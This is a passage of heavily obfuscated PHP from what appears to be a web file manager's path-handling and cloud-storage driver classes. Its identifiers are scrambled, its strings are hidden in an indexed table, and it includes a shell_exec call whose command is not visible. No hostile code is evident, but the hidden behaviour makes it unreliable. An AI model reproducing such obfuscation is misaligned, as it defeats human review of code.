$ÄƒÎ¸ó‰; $íÖ¶î—[$«‰¼ÓÇ»[1351]] = substr($ÄƒÎ¸ó‰, 1, -1); $íÖ¶î—[$«‰¼ÓÇ»[475]] = $áÅ«•Œ°[3]; } $íÖ¶î—[$«‰¼ÓÇ»[1246]] = $áÅ«•Œ°[4]; } $³¿õŠŒ = array($«‰¼ÓÇ»[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $íÖ¶î—[$«‰¼ÓÇ»[1314]] = in_array($íÖ¶î—[$«‰¼ÓÇ»[33]], $³¿õŠŒ); return $íÖ¶î—; } public static function isTruePath($ªœ“¯­­) { $ĞÂÛéƒ =& $_SERVER[Ş­ğŠìÒ]; if (substr($ªœ“¯­­, 0, 1) != $ĞÂÛéƒ[1350]) { return !0; } if (strpos($ªœ“¯­­, $ĞÂÛéƒ[483]) === 0) { return !0; } if (strpos($ªœ“¯­­, $ĞÂÛéƒ[1318]) === 0) { return !0; } if (strpos($ªœ“¯­­, $ĞÂÛéƒ[1352]) === 0) { return !0; } if (strpos($ªœ“¯­­, $ĞÂÛéƒ[1353]) === 0) { return !0; } if (strpos($ªœ“¯­­, $ĞÂÛéƒ[1354]) === 0) { return !0; } return !1; } public static function clear($øò˜ï—) { $ğçÔ­ô§ =& $_SERVER[Ş­ğŠìÒ]; $øò˜ï— = str_replace(array($ğçÔ­ô§[1153], $ğçÔ­ô§[262]), $ğçÔ­ô§[53], $øò˜ï—); $øò˜ï— = str_replace($ğçÔ­ô§[100], $ğçÔ­ô§[8], $øò˜ï—); $ßóÈÜšé = $ğçÔ­ô§[1355]; if (substr($øò˜ï—, 0, 3) == $ğçÔ­ô§[1356]) { $øò˜ï— = substr($øò˜ï—, 3); } while (strstr($øò˜ï—, $ßóÈÜšé)) { $øò˜ï— = str_replace($ßóÈÜšé, $ğçÔ­ô§[8], $øò˜ï—); } $øò˜ï— = preg_replace($ğçÔ­ô§[1357], $ğçÔ­ô§[8], $øò˜ï—); if ($øò˜ï— == $ğçÔ­ô§[8]) { return $ğçÔ­ô§[8]; } $øò˜ï— = rtrim($øò˜ï—, $ğçÔ­ô§[8]); return $øò˜ï—; } public static function pathTrue($•àÀ¡ıí) { $ó€§î‰Ì =& $_SERVER[Ş­ğŠìÒ]; if (!$•àÀ¡ıí) { return $ó€§î‰Ì[12]; } $•àÀ¡ıí = str_replace($ó€§î‰Ì[592], $ó€§î‰Ì[8], str_replace($ó€§î‰Ì[1358], $ó€§î‰Ì[8], $•àÀ¡ıí)); $•àÀ¡ıí = str_replace($ó€§î‰Ì[592], $ó€§î‰Ì[8], str_replace($ó€§î‰Ì[1358], $ó€§î‰Ì[8], $•àÀ¡ıí)); if (!strstr($•àÀ¡ıí, $ó€§î‰Ì[1356])) { return $•àÀ¡ıí; } $‘®ÈÒ = explode($ó€§î‰Ì[8], $•àÀ¡ıí); foreach ($‘®ÈÒ as $¨Â¨¶› => $ã™´§) { if ($ã™´§ !== $ó€§î‰Ì[1359]) { continue; } for ($öğ·Ñœ˜ = $¨Â¨¶›; $öğ·Ñœ˜ >= 0; $öğ·Ñœ˜--) { if ($‘®ÈÒ[$öğ·Ñœ˜] === $ó€§î‰Ì[10] || $‘®ÈÒ[$öğ·Ñœ˜] === $ó€§î‰Ì[1359] || $‘®ÈÒ[$öğ·Ñœ˜] === -1) { continue; } if ($‘®ÈÒ[$öğ·Ñœ˜] === $ó€§î‰Ì[12]) { $‘®ÈÒ[$¨Â¨¶›] = -1; break; } $‘®ÈÒ[$¨Â¨¶›] = -1; $‘®ÈÒ[$öğ·Ñœ˜] = -1; break; } } $¡ü¶ªè = array(); foreach ($‘®ÈÒ as $ã™´§) { if ($ã™´§ !== -1) { $¡ü¶ªè[] = $ã™´§; } } $««ÍÅì› = implode($ó€§î‰Ì[8], $¡ü¶ªè); if (strpos($««ÍÅì›, $ó€§î‰Ì[1360]) === 0) { $««ÍÅì› = $ó€§î‰Ì[1356] . substr($««ÍÅì›, strlen($ó€§î‰Ì[1360])); } return $««ÍÅì›; } public static function pathUrlClear($±‘‡‚¾Ò) { $­É­ç˜ä =& $_SERVER[Ş­ğŠìÒ]; if (!$±‘‡‚¾Ò) { return $±‘‡‚¾Ò; } $±‘‡‚¾Ò = rawurldecode($±‘‡‚¾Ò); $±‘‡‚¾Ò = str_replace($­É­ç˜ä[1358], $­É­ç˜ä[8], $±‘‡‚¾Ò); if (strpos($±‘‡‚¾Ò, $­É­ç˜ä[76]) > 0) { $±‘‡‚¾Ò = substr($±‘‡‚¾Ò, 0, strpos($±‘‡‚¾Ò, $­É­ç˜ä[76])); } if (strpos($±‘‡‚¾Ò, $­É­ç˜ä[1361]) > 0) { $±‘‡‚¾Ò = substr($±‘‡‚¾Ò, 0, strpos($±‘‡‚¾Ò, $­É­ç˜ä[1361])); } return $±‘‡‚¾Ò; } public static function sourceID($ç†°Áİ) { $•¬êÂ© =& $_SERVER[Ş­ğŠìÒ]; $õ¥Ìé– = self::parse($ç†°Áİ); if ($õ¥Ìé–[$•¬êÂ©[33]] !== self::KOD_SOURCE) { show_json(LNG($•¬êÂ©[1362]), !1); } return $õ¥Ìé–[$•¬êÂ©[475]]; } public static function make($ù¡Èğ¹Ó) { if (!$ù¡Èğ¹Ó) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ù¡Èğ¹Ó)); } public static function makeShare($ÕÌ¥¿ö, $É •æÌ) { return self::makePath(self::KOD_SHARE_ITEM, $ÕÌ¥¿ö, $É •æÌ); } public static function makeFileTypePath($ì‚ïı’‚) { return self::makePath(self::KOD_USER_FILE_TYPE, $ì‚ïı’‚); } public static function makeFileTagPath($Öô´ÎÌ¸) { return self::makePath(self::KOD_USER_FILE_TAG, $Öô´ÎÌ¸); } public static function makePath($å†°õ¦½, $¢“øê›¶ = '', $°òÏŸü° = '') { $Â¼ªªï© =& $_SERVER[Ş­ğŠìÒ]; $²÷­¹› = substr($å†°õ¦½, 1, -1); $êŠÉïœ = $Â¼ªªï©[1363] . $²÷­¹› . $Â¼ªªï©[1364] . $¢“øê›¶ . $Â¼ªªï©[1365]; $êŠÉïœ = $°òÏŸü° ? $êŠÉïœ . $°òÏŸü° . $Â¼ªªï©[8] : $êŠÉïœ; return $êŠÉïœ; } public static function hashPath($ÜÅìÙãÄ, $šóåŒÎ = true) { $¸ñÇôÛ€ =& $_SERVER[Ş­ğŠìÒ]; $¼ÑÏĞ©È = is_array($ÜÅìÙãÄ) ? $ÜÅìÙãÄ : IO::info($ÜÅìÙãÄ); $Ÿ’¯ßµ = _get($¼ÑÏĞ©È, $¸ñÇôÛ€[1366], $¸ñÇôÛ€[12]); if (!$Ÿ’¯ßµ && isset($¼ÑÏĞ©È[$¸ñÇôÛ€[235]])) { $Ÿ’¯ßµ = trim($¼ÑÏĞ©È[$¸ñÇôÛ€[235]], $¸ñÇôÛ€[121]); } if (!$Ÿ’¯ßµ && isset($¼ÑÏĞ©È[$¸ñÇôÛ€[193]]) && $¼ÑÏĞ©È[$¸ñÇôÛ€[193]]) { $¼ÑÏĞ©È = IO::info(KodIO::make($¼ÑÏĞ©È[$¸ñÇôÛ€[193]])); $Ÿ’¯ßµ = _get($¼ÑÏĞ©È, $¸ñÇôÛ€[1366], $¸ñÇôÛ€[12]); } $³Õ¶¹¸ = md5($¼ÑÏĞ©È[$¸ñÇôÛ€[87]] . $¼ÑÏĞ©È[$¸ñÇôÛ€[79]] . $¼ÑÏĞ©È[$¸ñÇôÛ€[88]]); if (!$Ÿ’¯ßµ && file_exists($¼ÑÏĞ©È[$¸ñÇôÛ€[87]])) { $Ÿ’¯ßµ = Cache::get($³Õ¶¹¸ . $¸ñÇôÛ€[1367]); $Ÿ’¯ßµ = !1; if (!$Ÿ’¯ßµ) { $Ÿ’¯ßµ = IO::hashSimple($¼ÑÏĞ©È[$¸ñÇôÛ€[87]]); Cache::set($³Õ¶¹¸ . $¸ñÇôÛ€[1367], $Ÿ’¯ßµ, 3600 * 24 * 30); } } if ($šóåŒÎ && !$Ÿ’¯ßµ) { } return $Ÿ’¯ßµ ? $Ÿ’¯ßµ : $³Õ¶¹¸; } public static function hashPathSafe($›Š•Ş¦š, $¹¶™£½ = true) { $ûƒı¢ˆ¾ =& $_SERVER[Ş­ğŠìÒ]; $Ğñ† •† = self::hashPath($›Š•Ş¦š, $¹¶™£½); return md5($Ğñ† •† . $ûƒı¢ˆ¾[1368] . Model($ûƒı¢ˆ¾[837])->get($ûƒı¢ˆ¾[838])); } public static function initSystemPath() { $µÚåµí¼ =& $_SERVER[Ş­ğŠìÒ]; if (defined($µÚåµí¼[1369])) { return; } define($µÚåµí¼[1369], self::systemPath($µÚåµí¼[191])); define($µÚåµí¼[1370], self::systemPath($µÚåµí¼[1371])); define($µÚåµí¼[1372], self::systemPath($µÚåµí¼[1373])); define($µÚåµí¼[1374], self::systemPath($µÚåµí¼[1375])); IOHistory::bindEvent(); } public static function systemPath($ñÃ”ºŞ´) { $ßÃ¹ µĞ =& $_SERVER[Ş­ğŠìÒ]; $¶‡à½Ø½ = $ßÃ¹ µĞ[1376] . ucfirst($ñÃ”ºŞ´); $ş«ÁÙ“İ = Model($ßÃ¹ µĞ[837])->get($¶‡à½Ø½); if ($ş«ÁÙ“İ) { return $ş«ÁÙ“İ; } if ($ñÃ”ºŞ´ == $ßÃ¹ µĞ[191]) { $ş«ÁÙ“İ = self::make(Model($ßÃ¹ µĞ[891])->systemRootPathAdd($ßÃ¹ µĞ[605])); } else { $ş«ÁÙ“İ = self::systemPath($ßÃ¹ µĞ[191]); $ª·¸¢Ãï = self::sourceID($ş«ÁÙ“İ); $ş«ÁÙ“İ = self::make(Model($ßÃ¹ µĞ[891])->mkdir($ª·¸¢Ãï, $ñÃ”ºŞ´)); } Model($ßÃ¹ µĞ[837])->set($¶‡à½Ø½, $ş«ÁÙ“İ); return $ş«ÁÙ“İ; } public static function systemFolder($Ô‚™ù»Ñ) { $Ò¯ûÂâÑ = IO_PATH_SYSTEM_SOURCE . $Ô‚™ù»Ñ; $‚¶¹åÎ× = Cache::get($Ò¯ûÂâÑ); if (!$‚¶¹åÎ×) { $‚¦õòèà = IO::infoFullSimple($Ò¯ûÂâÑ); if (!$‚¦õòèà) { $‚¶¹åÎ× = IO::mkdir($Ò¯ûÂâÑ, REPEAT_SKIP); } else { $‚¶¹åÎ× = $‚¦õòèà[$_SERVER[Ş­ğŠìÒ][87]]; } Cache::set($Ò¯ûÂâÑ, $‚¶¹åÎ×, 3600 * 10); } return $‚¶¹åÎ×; } public static function defaultDriver() { return Model($_SERVER[Ş­ğŠìÒ][834])->defaultDriver(); } public static function defaultIO() { $éˆ¨À˜§ =& $_SERVER[Ş­ğŠìÒ]; $•‹Ò¥¹é = self::defaultDriver(); return $éˆ¨À˜§[1377] . $•‹Ò¥¹é[$éˆ¨À˜§[475]] . $éˆ¨À˜§[1365]; } public static function defaultDriverInit() { static $«½ñ¥šº = false; if ($«½ñ¥šº) { return $«½ñ¥šº; } $«½ñ¥šº = IO::init(self::defaultIO()); return $«½ñ¥šº; } public static function fileTypeList() { $ÄèÀœ‚Æ =& $_SERVER[Ş­ğŠìÒ]; $ÀŞúÌ¬Ã = $GLOBALS[$ÄèÀœ‚Æ[6]][$ÄèÀœ‚Æ[1378]]; foreach ($ÀŞúÌ¬Ã as $»–û¨èÃ => $ñ£¦û×) { $€¯–ş¨ = $ÄèÀœ‚Æ[1379] . $»–û¨èÃ; $“ø´¿¹ß = LNG($€¯–ş¨); if ($€¯–ş¨ != $“ø´¿¹ß) { $ÀŞúÌ¬Ã[$»–û¨èÃ][$ÄèÀœ‚Æ[32]] = $“ø´¿¹ß; } } return $ÀŞúÌ¬Ã; } public static function diskList($»îïšáò = true) { $û‡Õ»‰ = $_SERVER[Ş­ğŠìÒ][1380]; if ($»îïšáò) { $ÆÅİÄÌ• = Cache::get($û‡Õ»‰); if (is_array($ÆÅİÄÌ•)) { return $ÆÅİÄÌ•; } } $ÆÅİÄÌ• = self::diskListGet(); Cache::set($û‡Õ»‰, $ÆÅİÄÌ•, 60); return $ÆÅİÄÌ•; } public static function diskListGet() { $¨·ØÂ•• =& $_SERVER[Ş­ğŠìÒ]; $õ°ÃÊëÔ = array(); if ($GLOBALS[$¨·ØÂ••[6]][$¨·ØÂ••[1381]] == $¨·ØÂ••[1382]) { $²­·ÚŒ = $¨·ØÂ••[1383]; for ($¦ôæ¤´© = 0; $¦ôæ¤´© < strlen($²­·ÚŒ); $¦ôæ¤´©++) { $á¼Àèá = $²­·ÚŒ[$¦ôæ¤´©] . $¨·ØÂ••[1384]; if (file_exists($á¼Àèá)) { $õ°ÃÊëÔ[] = $á¼Àèá; } } return $õ°ÃÊëÔ; } if (!function_exists($¨·ØÂ••[101])) { $õ°ÃÊëÔ[] = $¨·ØÂ••[902]; return $õ°ÃÊëÔ; } $š©ôÀŸÜ = explode($¨·ØÂ••[262], shell_exec($¨·ØÂ••[1385])); array_shift($š©ôÀŸÜ); array_pop($š©ôÀŸÜ); $ôÅ©†·î = array($¨·ØÂ••[1386], $¨·ØÂ••[1387], $¨·ØÂ••[1388], $¨·ØÂ••[1389], $¨·ØÂ••[1390], $¨·ØÂ••[1391], $¨·ØÂ••[1392], $¨·ØÂ••[1393]); foreach ($š©ôÀŸÜ as $ıáˆíÁÛ) { $­ÉşÕ€ = preg_split($¨·ØÂ••[1394], $ıáˆíÁÛ); $á¼Àèá = $­ÉşÕ€[count($­ÉşÕ€) - 1]; if (!strstr($­ÉşÕ€[0], $¨·ØÂ••[1395]) || !$á¼Àèá) { continue; } $šÉÒÔ’ = rtrim($á¼Àèá, $¨·ØÂ••[8]) . $¨·ØÂ••[8]; if (in_array($šÉÒÔ’, $ôÅ©†·î)) { continue; } $õ°ÃÊëÔ[] = $šÉÒÔ’; } return $õ°ÃÊëÔ; } public static function isSameDisk($™ß“´, $ÒıŒÖÏ) { $¬´¹™÷ =& $_SERVER[Ş­ğŠìÒ]; if ($GLOBALS[$¬´¹™÷[6]][$¬´¹™÷[1381]] == $¬´¹™÷[1382]) { return strtolower(substr($™ß“´, 0, 1)) == strtolower(substr($ÒıŒÖÏ, 0, 1)); } $ÈÃ˜Œ  = self::diskList(); $Éµ®á“İ = !1; $Êè×£¹º = !1; sort($ÈÃ˜Œ ); $ÈÃ˜Œ  = array_reverse($ÈÃ˜Œ ); $™ß“´ = rtrim($™ß“´, $¬´¹™÷[8]) . $¬´¹™÷[8]; $ÒıŒÖÏ = rtrim($ÒıŒÖÏ, $¬´¹™÷[8]) . $¬´¹™÷[8]; foreach ($ÈÃ˜Œ  as $’»ºÕó¨) { $Œı†ìô  = strlen($’»ºÕó¨); if (!$Éµ®á“İ && substr($™ß“´, 0, $Œı†ìô ) == $’»ºÕó¨) { $Éµ®á“İ = $’»ºÕó¨; } if (!$Êè×£¹º && substr($ÒıŒÖÏ, 0, $Œı†ìô ) == $’»ºÕó¨) { $Êè×£¹º = $’»ºÕó¨; } if ($Éµ®á“İ && $Êè×£¹º) { break; } } return $Éµ®á“İ === $Êè×£¹º; } public static function transferType($ñÇ•«’, $ÔœÛùúµ) { $”‚ÃçÂ§ =& $_SERVER[Ş­ğŠìÒ]; $öÂÙƒÒê = self::driverType($ñÇ•«’); $©¶ºŸ»ı = self::driverType($ÔœÛùúµ); if ($öÂÙƒÒê[$”‚ÃçÂ§[33]] == $©¶ºŸ»ı[$”‚ÃçÂ§[33]] && $öÂÙƒÒê[$”‚ÃçÂ§[1396]] == $©¶ºŸ»ı[$”‚ÃçÂ§[1396]]) { return $”‚ÃçÂ§[1397]; } if ($öÂÙƒÒê[$”‚ÃçÂ§[33]] == $”‚ÃçÂ§[935] && $©¶ºŸ»ı[$”‚ÃçÂ§[33]] == $”‚ÃçÂ§[109]) { return $”‚ÃçÂ§[1275]; } if ($öÂÙƒÒê[$”‚ÃçÂ§[33]] == $”‚ÃçÂ§[109] && $©¶ºŸ»ı[$”‚ÃçÂ§[33]] == $”‚ÃçÂ§[935]) { return $”‚ÃçÂ§[110]; } return $”‚ÃçÂ§[1398]; } public static function driverType($ãƒõŒÎ) { $¯è¸Û´ =& $_SERVER[Ş­ğŠìÒ]; $Ôç·¬¢Õ = str_replace($¯è¸Û´[1399], $¯è¸Û´[12], strtolower($ãƒõŒÎ->getType())); if ($Ôç·¬¢Õ == $¯è¸Û´[824] || $Ôç·¬¢Õ == $¯è¸Û´[1400] || $Ôç·¬¢Õ == $¯è¸Û´[1401]) { $ãƒõŒÎ = self::defaultDriverInit(); } else { if ($Ôç·¬¢Õ == $¯è¸Û´[1285] || $Ôç·¬¢Õ == $¯è¸Û´[1402]) { $ãƒõŒÎ = IO::init($ãƒõŒÎ->pathParse[$¯è¸Û´[1228]]); } } $¿å•³Øš = $ãƒõŒÎ->path; $Ôç·¬¢Õ = str_replace($¯è¸Û´[1399], $¯è¸Û´[12], strtolower($ãƒõŒÎ->getType())); if ($Ôç·¬¢Õ == $¯è¸Û´[109]) { return array($¯è¸Û´[33] => $¯è¸Û´[109], $¯è¸Û´[1396] => $¯è¸Û´[12], $¯è¸Û´[87] => $¿å•³Øš, $¯è¸Û´[98] => $ãƒõŒÎ); } return array($¯è¸Û´[33] => $¯è¸Û´[935], $¯è¸Û´[1396] => $ãƒõŒÎ->pathDriver, $¯è¸Û´[87] => $¿å•³Øš, $¯è¸Û´[98] => $ãƒõŒÎ); } public static function pathDriverType($³¦öÜÃ¶) { return $³¦öÜÃ¶ ? self::driverType(IO::init($³¦öÜÃ¶)) : !1; } public static function pathDriverLocal($­çËÎöÔ) { $‰‘ˆÛ”Ø =& $_SERVER[Ş­ğŠìÒ]; $‹£Ï§¦ = $­çËÎöÔ ? self::driverType(IO::init($­çËÎöÔ)) : !1; return strtolower($‹£Ï§¦[$‰‘ˆÛ”Ø[33]]) == $‰‘ˆÛ”Ø[109] ? !0 : !1; } public static function allowCover($ÌÄÈÀÌ, $·’ÄÛÇŒ = true) { $äÆš¹Ö¢ =& $_SERVER[Ş­ğŠìÒ]; if (is_string($ÌÄÈÀÌ)) { $ÌÄÈÀÌ = IO::info($ÌÄÈÀÌ); } if (!$ÌÄÈÀÌ || $ÌÄÈÀÌ[$äÆš¹Ö¢[33]] == $äÆš¹Ö¢[78] || $ÌÄÈÀÌ[$äÆš¹Ö¢[79]] <= 100) { return !1; } if (isset($ÌÄÈÀÌ[$äÆš¹Ö¢[1403]]) || !$ÌÄÈÀÌ[$äÆš¹Ö¢[87]]) { return !1; } if (isset($ÌÄÈÀÌ[$äÆš¹Ö¢[232]]) && !$ÌÄÈÀÌ[$äÆš¹Ö¢[232]]) { return !1; } static $•ò Øä = false; if (!$•ò Øä || !$·’ÄÛÇŒ) { $¤²¶Ç• = self::driverType(IO::init($ÌÄÈÀÌ[$äÆš¹Ö¢[87]])); $àÑ´ú€ğ = $¤²¶Ç•[$äÆš¹Ö¢[98]]; $•ò Øä = $äÆš¹Ö¢[196]; if ($¤²¶Ç•[$äÆš¹Ö¢[33]] == $äÆš¹Ö¢[109]) { $•ò Øä = $äÆš¹Ö¢[1404]; } if ($¤²¶Ç•[$äÆš¹Ö¢[98]] && is_array($¤²¶Ç•[$äÆš¹Ö¢[98]]->config)) { $ø­¸¨Õš = $¤²¶Ç•[$äÆš¹Ö¢[98]]->config; if (isset($ø­¸¨Õš[$äÆš¹Ö¢[1405]]) && $ø­¸¨Õš[$äÆš¹Ö¢[1405]]) { $•ò Øä = $äÆš¹Ö¢[1404]; } } $ÈğÉšú = KodIO::defaultDriver(); if (strtolower($ÈğÉšú[$äÆš¹Ö¢[98]]) == $äÆš¹Ö¢[109] && is_array($ÈğÉšú[$äÆš¹Ö¢[6]])) { $Üí®‹Àç = $ÈğÉšú[$äÆš¹Ö¢[6]][$äÆš¹Ö¢[1258]]; if (substr($Üí®‹Àç, 0, 2) == $äÆš¹Ö¢[1406]) { $Üí®‹Àç = str_replace($äÆš¹Ö¢[1406], BASIC_PATH, $Üí®‹Àç); } $Üí®‹Àç = str_replace($äÆš¹Ö¢[592], $äÆš¹Ö¢[8], $Üí®‹Àç); if (substr($ÌÄÈÀÌ[$äÆš¹Ö¢[87]], 0, strlen($Üí®‹Àç)) == $Üí®‹Àç) { $•ò Øä = $äÆš¹Ö¢[196]; } } } return $•ò Øä == $äÆš¹Ö¢[1404] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($ÅˆüŠÑ¸) { parent::__construct($ÅˆüŠÑ¸); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($³”óÔ¨) { $×Ú¹‡Öš =& $_SERVER[Ş­ğŠìÒ]; if (substr($³”óÔ¨, 0, 7) == $×Ú¹‡Öš[313]) { $³”óÔ¨ = $×Ú¹‡Öš[314] . substr($³”óÔ¨, 7); } header($×Ú¹‡Öš[175] . $³”óÔ¨); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Êİ·î¿í) { parent::__construct($Êİ·î¿í); $this->setSignVersion($_SERVER[Ş­ğŠìÒ][247]); } public function uploadFormData($¨Ç–¬¥•, $Á´ÄÇ¥İ = 3600) { $ôÊğÉ˜³ =& $_SERVER[Ş­ğŠìÒ]; $”ÙŠóä = $ôÊğÉ˜³[229]; $¹¼‡¡ÉË = $ôÊğÉ˜³[263]; $Ø¨Ö‡‰ƒ = $ôÊğÉ˜³[274]; $ççº¹¹Ò = gmdate($ôÊğÉ˜³[299], time() + $Á´ÄÇ¥İ); $µÁËÁğû = (string) time() . $ôÊğÉ˜³[74] . (string) (time() + $Á´ÄÇ¥İ); $ÍÀØµ¼Æ = array($ôÊğÉ˜³[275] => $ççº¹¹Ò, $ôÊğÉ˜³[278] => array(array($ôÊğÉ˜³[280] => $”ÙŠóä), array($ôÊğÉ˜³[279] => $this->bucket), array($ôÊğÉ˜³[281], $ôÊğÉ˜³[282], $ôÊğÉ˜³[12]), array($ôÊğÉ˜³[285] => $Ø¨Ö‡‰ƒ), array($ôÊğÉ˜³[1407] => $¹¼‡¡ÉË), array($ôÊğÉ˜³[1408] => $this->accessKey), array($ôÊğÉ˜³[1409] => $µÁËÁğû))); $ÍÀØµ¼Æ = json_encode($ÍÀØµ¼Æ); $İÉÎÀÉÉ = hash_hmac($ôÊğÉ˜³[263], $µÁËÁğû, $this->secret); $ÈâšÜù = sha1($ÍÀØµ¼Æ); $’¤¹ùŸ = hash_hmac($ôÊğÉ˜³[263], $ÈâšÜù, $İÉÎÀÉÉ); $Ò¹›İíÉ = array($ôÊğÉ˜³[280] => $”ÙŠóä, $ôÊğÉ˜³[285] => $Ø¨Ö‡‰ƒ, $ôÊğÉ˜³[293] => base64_encode($ÍÀØµ¼Æ), $ôÊğÉ˜³[1407] => $¹¼‡¡ÉË, $ôÊğÉ˜³[1408] => $this->accessKey, $ôÊğÉ˜³[1410] => $µÁËÁğû, $ôÊğÉ˜³[1411] => $’¤¹ùŸ, $ôÊğÉ˜³[208] => $this->getHost()); return $Ò¹›İíÉ; } public function fileOutImage($ííïÕØÀ, $å¹ÄÊ’ú = 250) { $‹ğŒü› =& $_SERVER[Ş­ğŠìÒ]; if ($this->size($ííïÕØÀ) > 1024 * 1024 * 32) { return $this->fileOutImageServer($ííïÕØÀ, $å¹ÄÊ’ú); } $Ò¤ëüĞ = $this->link($ííïÕØÀ); $Ò¤ëüĞ .= $‹ğŒü›[1412] . $å¹ÄÊ’ú . $‹ğŒü›[1413]; $this->fileOutLink($Ò¤ëüĞ); } public function fileOutLink($Ä§Š°€) { $è¨÷¶Ñş =& $_SERVER[Ş­ğŠìÒ]; if (substr($Ä§Š°€, 0, 7) == $è¨÷¶Ñş[313]) { $Ä§Š°€ = $è¨÷¶Ñş[314] . substr($Ä§Š°€, 7); } header($è¨÷¶Ñş[175] . $Ä§Š°€); die; } } goto B˜³ÛÉÇáÄ; CÑÍ¾‹éÖÕ: class PathDriverDriverShareItem { public function __construct($¢—±—¡…) { $this->pathParse = $¢—±—¡…; } public function __call($ùš¡„÷·, $Ÿ™Ö­úô) { $“Ûó¢® =& $_SERVER[Ş­ğŠìÒ]; if (method_exists($this, $ùš¡„÷·)) { return; } $€Ö²û² = call_user_func_array(array($“Ûó¢®[1423], $ùš¡„÷·), $Ÿ™Ö­úô); $Å¬ã— = array($“Ûó¢®[1424], $“Ûó¢®[1425], $“Ûó¢®[1426], $“Ûó¢®[1427], $“Ûó¢®[618], $“Ûó¢®[620], $“Ûó¢®[1428], $“Ûó¢®[110], $“Ûó¢®[1429], $“Ûó¢®[1430]); if (in_array($ùš¡„÷·, $Å¬ã—)) { $€Ö²û² = $this->getPathOuter($€Ö²û²); } return $€Ö²û²; } public function copy($àÎ¿Àâ, $›ØËÉÚÓ, $–÷¤—ÇÏ = false, $‰Í“»§ = false) { return $this->copyMove($àÎ¿Àâ, $›ØËÉÚÓ, $–÷¤—ÇÏ, $_SERVER[Ş­ğŠìÒ][618], $‰Í“»§); } public function move($¦ÓÅ¹‘, $­îİ¥äÎ, $Ä†Ëßë‘ = false, $Î ÛòÖ„ = false) { return $this->copyMove($¦ÓÅ¹‘, $­îİ¥äÎ, $Ä†Ëßë‘, $_SERVER[Ş­ğŠìÒ][620], $Î ÛòÖ„); } private function copyMove($¿›§³½ö, $ƒö²œğê, $ºŒĞŒÂÅ, $Ø¼¹¥™, $°å‡ªº¿ = false) { $Ö½Œ…È÷ =& $_SERVER[Ş­ğŠìÒ]; $Ş¯Ü°÷¤ = $ƒö²œğê; $Ñ·°¤Áá = IO::driverMake($ƒö²œğê); if ($Ñ·°¤Áá->pathParse[$Ö½Œ…È÷[1228]]) { $ƒö²œğê = $Ñ·°¤Áá->pathParse[$Ö½Œ…È÷[1228]]; } else { $ƒö²œğê = $Ş¯Ü°÷¤; } $å½Í®ø¯ = IO::copyMove($¿›§³½ö, $ƒö²œğê, $ºŒĞŒÂÅ, $Ø¼¹¥™, $°å‡ªº¿); $å½Í®ø¯ = $this->getPathOuter($å½Í®ø¯); return $å½Í®ø¯; } public function pathThis($Êùä½ûÈ) { return get_path_this($this->pathParse[$_SERVER[Ş­ğŠìÒ][87]]); } public function pathFather($†¯Ù¡–ã) { return get_path_father($this->pathParse[$_SERVER[Ş­ğŠìÒ][87]]); } public function iconvSystem($îÇ¯õöÊ) { return $îÇ¯õöÊ; } protected function infoParse($ ‰ĞèúÙ, $õÍÓŒ¿² = false) { $ÄÑ¹ãªš =& $_SERVER[Ş­ğŠìÒ]; $ê²Ìò°í = $this->pathParse[$ÄÑ¹ãªš[560]][$ÄÑ¹ãªš[1253]] . $this->pathParse[$ÄÑ¹ãªš[1246]]; if ($õÍÓŒ¿²) { $×ÈªÉ› = IO::infoWithChildren($ê²Ìò°í); } else { $×ÈªÉ› = IO::info($ê²Ìò°í); } $Ã‰ŠŞÎÔ = $this->pathParse[$ÄÑ¹ãªš[560]]; return Action($ÄÑ¹ãªš[1421])->_shareItemeParse($×ÈªÉ›, $Ã‰ŠŞÎÔ); } public function listAll($È‰ á‡ò) { $–ÓŒÊ  =& $_SERVER[Ş­ğŠìÒ]; $ƒ•“¾ = IO::listAll($È‰ á‡ò); $è‰¸¶Øâ = rtrim($this->pathParse[$–ÓŒÊ [560]][$–ÓŒÊ [1253]], $–ÓŒÊ [8]); foreach ($ƒ•“¾ as &$Ò¯Š˜‹) { $Ò¯Š˜‹[$–ÓŒÊ [87]] = $this->pathDriver . $–ÓŒÊ [8] . ltrim(substr($Ò¯Š˜‹[$–ÓŒÊ [87]], strlen($è‰¸¶Øâ)), $–ÓŒÊ [8]); } unset($Ò¯Š˜‹); return $ƒ•“¾; } public function listAllSimple($—Ÿ¯ù‹, $¦òíÓÜı = false) { $†ºëèÏ’ =& $_SERVER[Ş­ğŠìÒ]; $áŸâ­İê = $this->listAll($—Ÿ¯ù‹); $¢´­ûØ = $this->pathParse[$†ºëèÏ’[495]]; if (trim($¢´­ûØ, $†ºëèÏ’[8]) == trim(get_path_father($¢´­ûØ), $†ºëèÏ’[8])) { $¦òíÓÜı = !0; } return IO::init($†ºëèÏ’[12])->listAllSimpleMake($áŸâ­İê, $¢´­ûØ, $¦òíÓÜı); } public function getPathOuter($×ÙšÊİŞ) { $³µöµŠ‘ =& $_SERVER[Ş­ğŠìÒ]; $›¯îõëŸ = KodIO::parse($×ÙšÊİŞ); if ($›¯îõëŸ[$³µöµŠ‘[33]] == KodIO::KOD_SHARE_ITEM) { return $›¯îõëŸ[$³µöµŠ‘[87]]; } $¹ Ìõçí = KodIO::clear($×ÙšÊİŞ); $¦ÉÏú¢£ = KodIO::clear($this->pathParse[$³µöµŠ‘[560]][$³µöµŠ‘[1253]]); $›¸Ê°¢» = substr($¹ Ìõçí, strlen($¦ÉÏú¢£)); if (substr($¹ Ìõçí, 0, strlen($¦ÉÏú¢£)) != $¦ÉÏú¢£) { return !1; } return $this->pathParse[$³µöµŠ‘[1247]] . $³µöµŠ‘[8] . ltrim($›¸Ê°¢», $³µöµŠ‘[8]); } public function getType() { $Ü—ÕŒ° =& $_SERVER[Ş­ğŠìÒ]; $ÊëÖğî¸ = str_replace($Ü—ÕŒ°[77], $Ü—ÕŒ°[12], get_class($this)); return strtolower($ÊëÖğî¸); } public function isOsDriver($Îİ¡ù¨á) { return IO::isOsDriver($Îİ¡ù¨á); } public function info($ó³„ƒò…) { return $this->infoParse($ó³„ƒò…); } public function infoAuth($Œíœ™¶) { return $this->infoParse($Œíœ™¶); } public function infoWithChildren($¥³õŒ«®) { return $this->infoParse($¥³õŒ«®, !0); } public function infoFull($Ú§Â”Û‚) { return $this->infoParse($Ú§Â”Û‚); } } class PathDriverDriverShareLink extends 